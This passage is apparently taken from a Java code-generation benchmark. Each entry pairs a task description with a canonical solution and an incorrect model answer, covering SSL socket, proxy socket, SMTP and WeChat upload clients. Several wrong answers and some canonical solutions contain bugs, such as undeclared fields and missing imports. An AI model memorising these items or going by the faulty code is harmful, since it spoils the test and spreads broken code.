    "wrong_result": "import org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Component;\nimport org.springframework.http.*;\nimport org.springframework.util.MultiValueMap;\nimport org.springframework.util.LinkedMultiValueMap;\nimport org.springframework.web.client.RestTemplate;\nimport org.springframework.core.io.ByteArrayResource;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\n\nimport java.io.IOException;\nimport java.util.*;\n\n@Component\npublic class WechatMediaUtil {\n\n    @Autowired\n    private WechatAccessTokenUtil wechatAccessTokenUtil;\n\n    private static final String MEDIA_URL = \"https://api.weixin.qq.com/cgi-bin/media/upload?access_token={ACCESS_TOKEN}&type={TYPE}\";\n\n    private final RestTemplate restTemplate = new RestTemplate();\n    private final ObjectMapper objectMapper = new ObjectMapper();\n\n    public String uploadMedia(String type, String mediaFileUrl) {\n        String accessToken = wechatAccessTokenUtil.getAccessToken();\n        if (accessToken == null || accessToken.isEmpty()) {\n            accessToken = wechatAccessTokenUtil.refreshAccessToken();\n        }\n\n        String url = MEDIA_URL.replace(\"{ACCESS_TOKEN}\", accessToken).replace(\"{TYPE}\", type);\n\n        try {\n            ResponseEntity<byte[]> response = restTemplate.getForEntity(mediaFileUrl, byte[].class);\n            byte[] fileBytes = response.getBody();\n            String contentType = response.getHeader(\"Content-Type\");\n\n            String fileExtension = judgeType(contentType);\n\n            MultiValueMap<String, Object> formData = new LinkedMultiValueMap<>();\n            formData.add(\"media\", new ByteArrayResource(fileBytes) {\n                @Override\n                public String getFilename() {\n                    return fileExtension;\n                }\n            });\n\n            HttpHeaders headers = new HttpHeaders();\n            headers.setContentType(MediaType.MULTIPART_FORM_DATA);\n\n            HttpEntity<MultiValueMap<String, Object>> request = new HttpEntity<>(formData, headers);\n\n            ResponseEntity<String> responseEntity = restTemplate.postForEntity(url, request, String.class);\n            JsonNode jsonNode = objectMapper.readTree(responseEntity.getBody());\n            return jsonNode.get(\"media_id\").asText();\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to upload media\", e);\n        }\n    }\n\n    private String judgeType(String contentType) {\n        if (contentType.startsWith(\"image/\")) {\n            return \".jpg\";\n        } else if (contentType.startsWith(\"video/\")) {\n            return \".mp4\";\n        } else if (contentType.startsWith(\"audio/\")) {\n            return \".mp3\";\n        } else {\n            throw new IllegalArgumentException(\"Unsupported content type: \" + contentType);\n        }\n    }\n}"
  },
  {
    "Task_id": 560,
    "Instruction": "Task Description: Create a Java class that implements a secure socket client using SSL/TLS to communicate with a server. The client should be able to send HTTP requests and read responses.\n\nClass Description: The SocketClient class establishes a secure connection to a server using SSL/TLS, sends an HTTP GET request, and reads the response. It handles socket creation, SSL handshake, request sending, and response parsing.\n\nAttributes:\n- clientSslContext: [SSLContext] - The SSL context used for creating secure sockets\n- address: [InetSocketAddress] - The server address (host and port) to connect to\n\nMethods:\n- Constructor: [SocketClient]([SSLContext clientSslContext, InetSocketAddress address]) -> [void] - Initializes the client with SSL context and server address\n- doRequest: [doRequest]() -> [void] - Establishes connection, sends HTTP request, reads response, and closes connection (throws IOException)\n- readLine: [readLine]([InputStream is]) -> [String] - Helper method to read a line from input stream (throws IOException)\n- readResponse: [readResponse]([SSLSocket sslSocket]) -> [void] - Reads and processes the HTTP response headers and body (throws IOException)",
    "Canonical_solution": "import io.undertow.Undertow;\nimport io.undertow.util.Headers;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.PrintWriter;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSocket;\n\npublic class SocketClient {\n\n    private SSLContext clientSslContext;\n    private InetSocketAddress address;\n\n    public SocketClient(SSLContext clientSslContext, InetSocketAddress address) {\n        this.clientSslContext = clientSslContext;\n        this.address = address;\n    }\n\n    public void doRequest() throws IOException {\n        Socket rawSocket = new Socket();\n        rawSocket.connect(address);\n        SSLSocket sslSocket = (SSLSocket) clientSslContext.getSocketFactory()\n            .createSocket(rawSocket, \"localhost\", address.getPort(), false);\n        PrintWriter writer = new PrintWriter(sslSocket.getOutputStream());\n        writer.println(\"GET / HTTP/1.1\");\n        writer.println(\"Host: localhost\");\n        writer.println(\"Connection: keep-alive\");\n        writer.println();\n        writer.flush();\n        readResponse(sslSocket);\n\n        sslSocket.shutdownOutput();\n        rawSocket.close();\n    }\n\n    private String readLine(InputStream is) throws IOException {\n        StringBuilder line = new StringBuilder();\n        while (true) {\n            int c = is.read();\n            switch (c) {\n                case -1:\n                    throw new RuntimeException(\"Unexpected EOF\");\n                case '\\r':\n                    continue;\n                case '\\n':\n                    return line.toString();\n                default:\n                    line.append((char) c);\n            }\n        }\n    }\n\n    private void readResponse(SSLSocket sslSocket) throws IOException {\n        String line;\n        int contentLength = 0;\n        Pattern CONTENT_LENGTH_PATTERN = Pattern.compile(\"Content-Length: ([0-9]+)\", Pattern.CASE_INSENSITIVE);\n\n        do {\n            line = readLine(sslSocket.getInputStream());\n            Matcher matcher = CONTENT_LENGTH_PATTERN.matcher(line);\n            if (matcher.matches()) {\n                contentLength = Integer.parseInt(matcher.group(1), 10);\n            }\n        } while (!line.isEmpty());\n\n        for (int i = 0; i < contentLength; i++) {\n            sslSocket.getInputStream().read();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class SocketClient {\n    private SSLContext clientSslContext;\n    private InetSocketAddress address;\n\n    public SocketClient(SSLContext clientSslContext, InetSocketAddress address) {\n        this.clientSslContext = clientSslContext;\n        this.address = address;\n    }\n\n    public void doRequest() throws IOException {\n        try (SSLSocket socket = (SSLSocket) clientSslContext.getSocketFactory().createSocket()) {\n            socket.connect(address);\n            try (OutputStream out = socket.getOutputStream()) {\n                String request = \"GET / HTTP/1.1\\r\\nHost:\" + address.getHostString() + \"\\r\\n\\r\\n\";\n                out.write(request.getBytes(StandardCharsets.UTF_8));\n                out.flush();\n            }\n            readResponse(socket);\n        }\n    }\n\n    private String readLine(InputStream is) throws IOException {\n        StringBuilder sb = new StringBuilder();\n        int c;\n        while ((c = is.read()) != -1) {\n            if (c == '\\n') break;\n            sb.append((char) c);\n        }\n        return sb.toString();\n    }\n\n    private void readResponse(SSLSocket sslSocket) throws IOException {\n        try (InputStream is = sslSocket.getInputStream()) {\n            String statusLine = readLine(is);\n            System.out.println(\"Status Line: \" + statusLine);\n            while (!readLine(is).isEmpty()) {\n                // Read headers\n            }\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = is.read(buffer)) != -1) {\n                // Process body\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 561,
    "Instruction": "Task Description: Create a Java class that implements a TCP socket client capable of connecting to servers directly or through HTTP proxies, with support for SSL/TLS connections.\n\nClass Description: RouterSocketClient is a networking class that handles socket connections to remote servers, supporting both direct connections and HTTP proxy connections. It includes SSL/TLS capabilities and handles various connection scenarios with appropriate timeouts.\n\nAttributes:\n- TAG: [String] - Class tag for logging purposes\n- SERVER_CONNECT_TIMEOUT_MILLIS: [int] - Timeout for server connections (20 seconds)\n- HTTP_PROXY_CONNECT_TIMEOUT_MILLIS: [int] - Timeout for HTTP proxy connections (5 seconds)\n- TLS_HANDSHAKE_TIMEOUT_MILLIS: [int] - Timeout for TLS handshake (20 seconds)\n- mLock: [Object] - Synchronization lock object\n- mConnectivityManager: [ConnectivityManager] - Android network connectivity manager\n- mSSLSocketFactory: [SSLSocketFactory] - SSL socket factory for secure connections\n- mContext: [Context] - Android application context\n- mDelayedRestartHandler: [Handler] - Handler for delayed operations\n- mSocket: [Socket] - Current active socket connection\n- mThread: [Thread] - Thread handling socket operations\n\nMethods:\n- RouterSocketClient(Context, ConnectivityManager, Random) -> [Constructor] - Initializes the client with context, connectivity manager, and random number generator\n- connectSocket(String host, int port) -> [Socket] - Static method that establishes a socket connection to the specified host:port, handling both direct and proxy connections\n- connectSocketNoProxy(String host, int port) -> [Socket] - Static helper method for direct socket connections without proxy\n- connectSocketViaHttpProxyConnectMethod(String host, int port, SocketAddress proxyAddress) -> [Socket] - Static helper method for establishing connections through HTTP proxies using CONNECT method\n- tryEnableSni(SSLSocket socket, String hostname) -> [void] - Attempts to enable Server Name Indication (SNI) on the SSL socket\n- tryEnableSessionTickets(SSLSocket socket) -> [void] - Attempts to enable session tickets on the SSL socket",
    "Canonical_solution": "import android.content.Context;\nimport android.net.ConnectivityManager;\nimport android.net.NetworkInfo;\nimport android.os.Handler;\nimport android.util.Log;\n\nimport java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.EOFException;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.lang.reflect.InvocationTargetException;\nimport java.net.InetSocketAddress;\nimport java.net.Proxy;\nimport java.net.ProxySelector;\nimport java.net.Socket;\nimport java.net.SocketAddress;\nimport java.net.URI;\nimport java.security.cert.X509Certificate;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.Random;\nimport java.util.concurrent.CopyOnWriteArrayList;\n\nimport javax.net.ssl.SSLSocket;\nimport javax.net.ssl.SSLSocketFactory;\n\npublic class RouterSocketClient {\n\n    private static final String TAG = RouterSocketClient.class.getSimpleName();\n    private static final int SERVER_CONNECT_TIMEOUT_MILLIS = 20000;\n    private static final int HTTP_PROXY_CONNECT_TIMEOUT_MILLIS = 5000;\n    private static final int TLS_HANDSHAKE_TIMEOUT_MILLIS = 20000;\n\n    private final Object mLock = new Object();\n    private final ConnectivityManager mConnectivityManager;\n    private final SSLSocketFactory mSSLSocketFactory;\n    private final Context mContext;\n    private final Handler mDelayedRestartHandler;\n    private Socket mSocket;\n    private Thread mThread;\n\n    public RouterSocketClient(\n            Context context,\n            ConnectivityManager connectivityManager,\n            Random rng) {\n        mContext = context;\n        mDelayedRestartHandler = new Handler(mContext.getMainLooper());\n        mConnectivityManager = connectivityManager;\n        mSSLSocketFactory = (SSLSocketFactory) SSLSocketFactory.getDefault();\n    }\n\n    private static Socket connectSocket(String host, int port) throws IOException {\n        URI serverUri = URI.create(\"https://\" + host + \":\" + port);\n        ProxySelector proxySelector = ProxySelector.getDefault();\n        List<Proxy> proxies = proxySelector.select(serverUri);\n        if ((proxies == null) || (proxies.isEmpty())) {\n            proxies = Collections.singletonList(Proxy.NO_PROXY);\n        }\n\n        IOException lastFailure = null;\n        for (Proxy proxy : proxies) {\n            SocketAddress proxyAddress = proxy.address();\n            try {\n                if (Proxy.NO_PROXY.equals(proxy)) {\n                    return connectSocketNoProxy(host, port);\n                } else if (proxy.type() == Proxy.Type.HTTP) {\n                    return connectSocketViaHttpProxyConnectMethod(host, port, proxyAddress);\n                }\n            } catch (IOException e) {\n                lastFailure = e;\n                if (proxyAddress != null) {\n                    proxySelector.connectFailed(serverUri, proxyAddress, e);\n                }\n            }\n        }\n\n        if (lastFailure != null) {\n            throw lastFailure;\n        }\n        throw new IOException(\"No suitable connection methods found for \" + serverUri + \": \" + proxies);\n    }\n\n    private static Socket connectSocketNoProxy(String host, int port) throws IOException {\n        Log.d(TAG, \"Connecting to \" + host + \":\" + port + \" directly\");\n        Socket socket = new Socket();\n        boolean success = false;\n        try {\n            SocketAddress address = new InetSocketAddress(host, port);\n            socket = new Socket();\n            socket.connect(address, SERVER_CONNECT_TIMEOUT_MILLIS);\n            success = true;\n            return socket;\n        } finally {\n            if (!success) {\n                socket.close();\n            }\n        }\n    }\n\n    private static Socket connectSocketViaHttpProxyConnectMethod(\n            String host, int port, SocketAddress proxyAddress) throws IOException {\n        Log.d(TAG, \"Connecting to \" + host + \":\" + port + \" via HTTP proxy \" + proxyAddress);\n        Socket socket = new Socket();\n        boolean success = false;\n        try {\n            InetSocketAddress proxyInetAddress = (InetSocketAddress) proxyAddress;\n            if (proxyInetAddress.isUnresolved()) {\n                proxyInetAddress = new InetSocketAddress(\n                        proxyInetAddress.getHostName(),\n                        proxyInetAddress.getPort());\n            }\n            socket = new Socket();\n            socket.connect(proxyInetAddress, HTTP_PROXY_CONNECT_TIMEOUT_MILLIS);\n            BufferedWriter out = new BufferedWriter(new OutputStreamWriter(\n                    socket.getOutputStream(), \"US-ASCII\"));\n            out.write(\"CONNECT \" + host + \":\" + port + \" HTTP/1.1\\r\\n\");\n            out.write(\"Host: \" + host + \":\" + port + \"\\r\\n\");\n            out.write(\"\\r\\n\");\n            out.flush();\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(\n                    socket.getInputStream(), \"US-ASCII\"));\n            String line;\n            boolean statusLineRead = false;\n            boolean responseHeadersRead = false;\n            socket.setSoTimeout(SERVER_CONNECT_TIMEOUT_MILLIS);\n            while ((line = in.readLine()) != null) {\n                if (!statusLineRead) {\n                    String[] tokens = line.split(\"\\\\s+\", 3);\n                    if (tokens.length != 3) {\n                        throw new IOException(\"Unexpected reply from HTTP proxy: \" + line);\n                    }\n                    String httpVersion = tokens[0];\n                    String statusCodeString = tokens[1];\n                    String reason = tokens[2];\n                    if (!httpVersion.startsWith(\"HTTP/1.\")) {\n                        throw new IOException(\"Unsupported HTTP version in HTTP proxy response: \" + line);\n                    }\n                    if (!\"200\".equals(statusCodeString)) {\n                        throw new IOException(\n                                \"HTTP proxy CONNECT failed. Status: \" + statusCodeString + \", reason: \" + reason);\n                    }\n                    statusLineRead = true;\n                    continue;\n                }\n                if (line.length() == 0) {\n                    responseHeadersRead = true;\n                    break;\n                }\n            }\n\n            if (!statusLineRead) {\n                throw new EOFException(\"Empty response from HTTP proxy\");\n            }\n            if (!responseHeadersRead) {\n                throw new EOFException(\"Premature end of stream while reading HTTP proxy response\");\n            }\n\n            success = true;\n            return socket;\n        } finally {\n            if (!success) {\n                socket.close();\n            }\n        }\n    }\n\n    private static void tryEnableSni(SSLSocket socket, String hostname) throws IOException {\n        try {\n            socket.getClass().getMethod(\"setHostname\", String.class).invoke(socket, hostname);\n        } catch (NoSuchMethodException | IllegalAccessException e) {\n            e.printStackTrace();\n        } catch (InvocationTargetException e) {\n            throw new IOException(\"Failed to enable SNI via Reflection API\", e);\n        }\n    }\n\n    private static void tryEnableSessionTickets(SSLSocket socket) throws IOException {\n        try {\n            socket.getClass().getMethod(\"setUseSessionTickets\", boolean.class).invoke(socket, true);\n        } catch (NoSuchMethodException | IllegalAccessException e) {\n            e.printStackTrace();\n        } catch (InvocationTargetException e) {\n            throw new IOException(\"Failed to enable session tickets via Reflection API\", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class RouterSocketClient {\n    private static final String TAG = \"RouterSocketClient\";\n    private static final int SERVER_CONNECT_TIMEOUT_MILLIS = 20000;\n    private static final int HTTP_PROXY_CONNECT_TIMEOUT_MILLIS = 5000;\n    private static final int TLS_HANDSHAKE_TIMEOUT_MILLIS = 20000;\n    private final Object mLock = new Object();\n    private final ConnectivityManager mConnectivityManager;\n    private SSLSocketFactory mSSLSocketFactory;\n    private final Context mContext;\n    private final Handler mDelayedRestartHandler = new Handler(Looper.getMainLooper());\n    private Socket mSocket;\n    private Thread mThread;\n\n    public RouterSocketClient(Context context, ConnectivityManager connectivityManager, Random random) {\n        mContext = context;\n        mConnectivityManager = connectivityManager;\n        mSSLSocketFactory = SSLContext.getDefault().getSocketFactory();\n    }\n\n    public static Socket connectSocket(String host, int port) {\n        Proxy proxy = mConnectivityManager.getProxy();\n        if (proxy != null && proxy.type == Proxy.Type.HTTP) {\n            try {\n                Socket proxySocket = new Socket(proxy.address, proxy.port);\n                proxySocket.setSoTimeout(HTTP_PROXY_CONNECT_TIMEOUT_MILLIS);\n                proxySocket.connect(new InetSocketAddress(host, port), HTTP_PROXY_CONNECT_TIMEOUT_MILLIS);\n                OutputStream out = proxySocket.getOutputStream();\n                PrintWriter writer = new PrintWriter(out, true);\n                writer.println(\"CONNECT \" + host + \":\" + port + \" HTTP/1.1\");\n                writer.println(\"Host: \" + host + \":\" + port);\n                writer.println();\n                writer.flush();\n                InputStream in = proxySocket.getInputStream();\n                BufferedReader reader = new BufferedReader(new InputStreamReader(in));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    if (line.startsWith(\"HTTP/1.1 200\")) {\n                        break;\n                    }\n                }\n                Socket targetSocket = new Socket();\n                targetSocket.setSoTimeout(SERVER_CONNECT_TIMEOUT_MILLIS);\n                targetSocket.connect(new InetSocketAddress(host, port), SERVER_CONNECT_TIMEOUT_MILLIS);\n                return targetSocket;\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n        return connectSocketNoProxy(host, port);\n    }\n\n    private static Socket connectSocketNoProxy(String host, int port) {\n        try {\n            Socket socket = new Socket();\n            socket.setSoTimeout(SERVER_CONNECT_TIMEOUT_MILLIS);\n            socket.connect(new InetSocketAddress(host, port), SERVER_CONNECT_TIMEOUT_MILLIS);\n            return socket;\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    private static Socket connectSocketViaHttpProxyConnectMethod(String host, int port, SocketAddress proxyAddress) {\n        try {\n            Socket proxySocket = new Socket(proxyAddress);\n            proxySocket.setSoTimeout(HTTP_PROXY_CONNECT_TIMEOUT_MILLIS);\n            proxySocket.connect(new InetSocketAddress(host, port), HTTP_PROXY_CONNECT_TIMEOUT_MILLIS);\n            OutputStream out = proxySocket.getOutputStream();\n            PrintWriter writer = new PrintWriter(out, true);\n            writer.println(\"CONNECT \" + host + \":\" + port + \" HTTP/1.1\");\n            writer.println(\"Host: \" + host + \":\" + port);\n            writer.println();\n            writer.flush();\n            InputStream in = proxySocket.getInputStream();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(in));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                if (line.startsWith(\"HTTP/1.1 200\")) {\n                    break;\n                }\n            }\n            Socket targetSocket = new Socket();\n            targetSocket.setSoTimeout(SERVER_CONNECT_TIMEOUT_MILLIS);\n            targetSocket.connect(new InetSocketAddress(host, port), SERVER_CONNECT_TIMEOUT_MILLIS);\n            return targetSocket;\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    private void tryEnableSni(SSLSocket socket, String hostname) {\n        if (socket instanceof SSLEngine) {\n            return;\n        }\n        if (socket.getSSLParameters() != null) {\n            socket.getSSLParameters().setServerNames(Collections.singletonList(hostname));\n        } else {\n            socket.setSSLParameters(new SSLParameters());\n            socket.getSSLParameters().setServerNames(Collections.singletonList(hostname));\n        }\n    }\n\n    private void tryEnableSessionTickets(SSLSocket socket) {\n        if (socket instanceof SSLEngine) {\n            return;\n        }\n        if (socket.getSSLParameters() != null) {\n            socket.getSSLParameters().setUseSessionTickets(true);\n        } else {\n            socket.setSSLParameters(new SSLParameters());\n            socket.getSSLParameters().setUseSessionTickets(true);\n        }\n    }\n}"
  },
  {
    "Task_id": 562,
    "Instruction": "Task Description: Implement a Java class that handles sending emails with attachments via SMTP protocol using socket programming.\n\nClass Description: The SendMailJob class provides functionality to connect to an SMTP server, compose and send emails with attachments, and properly handle the email sending process including connection management and error handling.\n\nAttributes:\n- socket: [Socket] - The socket connection to the SMTP server\n- in: [BufferedReader] - Input stream for reading server responses\n- out: [OutputStream] - Output stream for sending commands to the server\n- out64: [Base64OutputStream] - Base64 encoded output stream for sending attachments\n- connectedToMailServer: [boolean] - Flag indicating connection status\n- mailServer: [String] - SMTP server address\n- fromAddress: [String] - Sender's email address\n- boundary: [String] - MIME boundary for multipart messages\n- recipientString: [String] - Comma-separated recipient addresses\n- mailSubject: [String] - Email subject line\n- mailBody: [String] - Email body content\n- errorDialogTitle: [String] - Title for error dialogs\n\nMethods:\n- SendMailJob([ProgressDialog, MainFrame, FileSet, String, String, String]) -> [void] - Constructor that initializes email parameters and configurations\n- openConnection() -> [void] - Establishes connection with SMTP server and initializes streams\n- sendBody() -> [void] - Sends email headers and body content to the server\n- sendAttachment([AbstractFile]) -> [void] - Encodes and sends file attachments to the server\n- closeConnection() -> [void] - Closes all connections and releases resources\n- readWriteLine([String]) -> [void] - Sends a command to server and reads response\n- writeLine([String]) -> [void] - Writes a line to the output stream\n- splitRecipientString([String, List<String>]) -> [String] - Parses recipient string into individual addresses",
    "Canonical_solution": "import com.mucommander.commons.file.AbstractFile;\nimport com.mucommander.commons.io.StreamUtils;\nimport com.mucommander.commons.io.base64.Base64OutputStream;\nimport com.mucommander.conf.MuConfigurations;\nimport com.mucommander.conf.MuPreference;\nimport com.mucommander.conf.MuPreferences;\nimport com.mucommander.job.FileJobState;\nimport com.mucommander.text.Translator;\nimport com.mucommander.ui.dialog.DialogAction;\nimport com.mucommander.ui.dialog.file.ProgressDialog;\nimport com.mucommander.ui.main.MainFrame;\n\nimport java.io.*;\nimport java.net.Socket;\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.StringTokenizer;\nimport java.util.Vector;\n\npublic class SendMailJob {\n\n    private Socket socket;\n    private BufferedReader in;\n    private OutputStream out;\n    private Base64OutputStream out64;\n    private boolean connectedToMailServer;\n    private String mailServer;\n    private String fromAddress;\n    private String boundary;\n    private String recipientString;\n    private String mailSubject;\n    private String mailBody;\n    private String errorDialogTitle;\n\n    public SendMailJob(ProgressDialog progressDialog, MainFrame mainFrame, FileSet filesToSend, String recipientString, String mailSubject, String mailBody) {\n        this.boundary = \"mucommander\" + System.currentTimeMillis();\n        this.recipientString = recipientString;\n        this.mailSubject = mailSubject;\n        this.mailBody = mailBody + \"\\n\\n\" + \"Sent by muCommander - http://www.mucommander.com\\n\";\n        this.mailServer = MuConfigurations.getPreferences().getVariable(MuPreference.SMTP_SERVER);\n        this.fromAddress = MuConfigurations.getPreferences().getVariable(MuPreference.MAIL_SENDER_ADDRESS);\n        this.errorDialogTitle = Translator.get(\"email_dialog.error_title\");\n    }\n\n    private void openConnection() throws IOException {\n        this.socket = new Socket(mailServer, MuConfigurations.getPreferences().getVariable(MuPreference.SMTP_PORT, MuPreferences.DEFAULT_SMTP_PORT));\n        this.in = new BufferedReader(new InputStreamReader(socket.getInputStream(), \"UTF-8\"));\n        this.out = socket.getOutputStream();\n        this.out64 = new Base64OutputStream(out, true);\n        this.connectedToMailServer = true;\n    }\n\n    private void sendBody() throws IOException {\n        readWriteLine(\"HELO muCommander\");\n        readWriteLine(\"MAIL FROM: \" + fromAddress);\n\n        List<String> recipients = new Vector<String>();\n        recipientString = splitRecipientString(recipientString, recipients);\n        int nbRecipients = recipients.size();\n        for (int i = 0; i < nbRecipients; i++)\n            readWriteLine(\"RCPT TO: <\" + recipients.get(i) + \">\");\n        readWriteLine(\"DATA\");\n        writeLine(\"MIME-Version: 1.0\");\n        writeLine(\"Subject: \" + this.mailSubject);\n        writeLine(\"From: \" + this.fromName + \" <\" + this.fromAddress + \">\");\n        writeLine(\"To: \" + recipientString);\n        writeLine(\"Content-Type: multipart/mixed; boundary=\\\"\" + boundary + \"\\\"\");\n        writeLine(\"\\r\\n--\" + boundary);\n        writeLine(\"Content-Type: text/plain; charset=\\\"utf-8\\\"\\r\\n\");\n        writeLine(this.mailBody + \"\\r\\n\\r\\n\");\n        writeLine(\"\\r\\n--\" + boundary);\n    }\n\n    private void sendAttachment(AbstractFile file) throws IOException {\n        InputStream fileIn = null;\n        try {\n            String mimeType = MimeTypes.getMimeType(file);\n            if (mimeType == null)\n                mimeType = \"application/octet-stream\";\n            writeLine(\"Content-Type:\" + mimeType + \"; name=\" + file.getName());\n            writeLine(\"Content-Disposition: attachment;filename=\\\"\" + file.getName() + \"\\\"\");\n            writeLine(\"Content-transfer-encoding: base64\\r\\n\");\n            fileIn = setCurrentInputStream(file.getInputStream());\n            StreamUtils.copyStream(fileIn, out64);\n            out64.writePadding();\n            writeLine(\"\\r\\n--\" + boundary);\n        } finally {\n            if (fileIn != null)\n                fileIn.close();\n        }\n    }\n\n    private void closeConnection() {\n        try {\n            socket.close();\n            in.close();\n            out64.close();\n        } catch (Exception e) {\n        }\n    }\n\n    private void readWriteLine(String s) throws IOException {\n        out.write((s + \"\\r\\n\").getBytes(\"UTF-8\"));\n        in.readLine();\n    }\n\n    private void writeLine(String s) throws IOException {\n        out.write((s + \"\\r\\n\").getBytes(\"UTF-8\"));\n    }\n\n    private String splitRecipientString(String recipientsStr, List<String> recipients) {\n        StringBuilder newRecipientsSb = new StringBuilder();\n        StringTokenizer st = new StringTokenizer(recipientsStr, \",;\");\n        String rec;\n        int pos1, pos2;\n        while (st.hasMoreTokens()) {\n            rec = st.nextToken().trim();\n            if ((pos1 = rec.indexOf('<')) != -1 && (pos2 = rec.indexOf('>', pos1 + 1)) != -1)\n                recipients.add(rec.substring(pos1 + 1, pos2));\n            else\n                recipients.add(rec);\n\n            newRecipientsSb.append(rec);\n            if (st.hasMoreTokens())\n                newRecipientsSb.append(\", \");\n        }\n        return newRecipientsSb.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "import java.io.*;\nimport java.net.*;\nimport java.util.*;\n\npublic class SendMailJob {\n    private Socket socket;\n    private BufferedReader in;\n    private OutputStream out;\n    private Base64.OutputStream out64;\n    private boolean connectedToMailServer;\n    private String mailServer;\n    private String fromAddress;\n    private String boundary;\n    private String recipientString;\n    private String mailSubject;\n    private String mailBody;\n    private String errorDialogTitle;\n\n    public SendMailJob(ProgressDialog progressDialog, MainFrame mainFrame, FileSet fileSet, String server, String sender, String subject) {\n        this.mailServer = server;\n        this.fromAddress = sender;\n        this.mailSubject = subject;\n        this.errorDialogTitle = \"Email Error\";\n        this.boundary = \"----\" + System.currentTimeMillis() + \"----\";\n    }\n\n    public void openConnection() {\n        try {\n            socket = new Socket(mailServer, 25);\n            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            out = socket.getOutputStream();\n            out64 = new Base64.OutputStream(out);\n            connectedToMailServer = true;\n        } catch (IOException e) {\n            connectedToMailServer = false;\n        }\n    }\n\n    public void sendBody() {\n        try {\n            writeLine(\"HELO \" + mailServer);\n            readWriteLine(\"HELO \" + mailServer);\n\n            writeLine(\"MAIL FROM:<\" + fromAddress + \">\");\n            readWriteLine(\"MAIL FROM:<\" + fromAddress + \">\");\n\n            String[] recipients = splitRecipientString(recipientString, new ArrayList<>());\n            for (String recipient : recipients) {\n                writeLine(\"RCPT TO:<\" + recipient + \">\");\n                readWriteLine(\"RCPT TO:<\" + recipient + \">\");\n            }\n\n            writeLine(\"DATA\");\n            readWriteLine(\"DATA\");\n\n            String mimeHeaders = \"Content-Type: multipart/mixed; boundary=\\\"\" + boundary + \"\\\"\\r\\n\" +\n                                 \"Message-ID: <\" + UUID.randomUUID() + \">\\r\\n\" +\n                                 \"From: \" + fromAddress + \"\\r\\n\" +\n                                 \"To: \" + recipientString + \"\\r\\n\" +\n                                 \"Subject: \" + mailSubject + \"\\r\\n\" +\n                                 \"\\r\\n\";\n\n            writeLine(mimeHeaders);\n            writeLine(\"--\" + boundary + \"\\r\\n\");\n            writeLine(\"Content-Type: text/plain; charset=UTF-8\\r\\n\");\n            writeLine(\"Content-Transfer-Encoding: 7bit\\r\\n\\r\\n\");\n            writeLine(mailBody + \"\\r\\n\");\n\n            for (AbstractFile file : fileSet.getFiles()) {\n                sendAttachment(file);\n            }\n\n            writeLine(\"--\" + boundary + \"--\\r\\n.\");\n            readWriteLine(\".\");\n        } catch (IOException e) {\n            // Handle error\n        }\n    }\n\n    public void sendAttachment(AbstractFile file) {\n        try {\n            byte[] fileBytes = file.getBytes();\n            byte[] encoded = Base64.getEncoder().encode(fileBytes);\n            out64.write(encoded);\n            out64.flush();\n        } catch (IOException e) {\n            // Handle error\n        }\n    }\n\n    public void closeConnection() {\n        try {\n            if (socket != null) socket.close();\n            if (in != null) in.close();\n            if (out != null) out.close();\n            if (out64 != null) out64.close();\n            connectedToMailServer = false;\n        } catch (IOException e) {\n            // Handle error\n        }\n    }\n\n    public void readWriteLine(String command) {\n        try {\n            writeLine(command);\n            String response = in.readLine();\n            System.out.println(response);\n        } catch (IOException e) {\n            // Handle error\n        }\n    }\n\n    public void writeLine(String line) {\n        try {\n            out.write((line + \"\\r\\n\").getBytes());\n            out.flush();\n        } catch (IOException e) {\n            // Handle error\n        }\n    }\n\n    public String splitRecipientString(String str, List<String> list) {\n        String[] parts = str.split(\",\");\n        for (String part : parts) {\n            list.add(part.trim());\n        }\n        return str;\n    }\n}"
  },
  {
    "Task_id": 563,
    "Instruction": "Task Description: Create a Java function that tests a client-server connection using Socket programming, including handling connection events and verifying successful communication.\n\nFunction Description: The function establishes a TCP connection to a server, sends an HTTP GET request, and verifies both connection establishment and message delivery. It uses CountDownLatch for synchronization between the main thread and callback handlers. The function fails if either the connection or message delivery doesn't complete within specified timeouts.\n\nInput: None (uses DefaultServer class for host configuration)\n\nOutput: None (throws exceptions or asserts failures for unsuccessful operations)\n\nKey Operations:\n1. Creates Socket connection to default server\n2. Sets up server event handlers with callbacks\n3. Obtains input/output streams for communication\n4. Sends HTTP GET request\n5. Verifies connection establishment within 10 seconds\n6. Verifies message delivery within 10 seconds\n7. Properly closes resources\n8. Uses synchronization primitives for thread coordination",
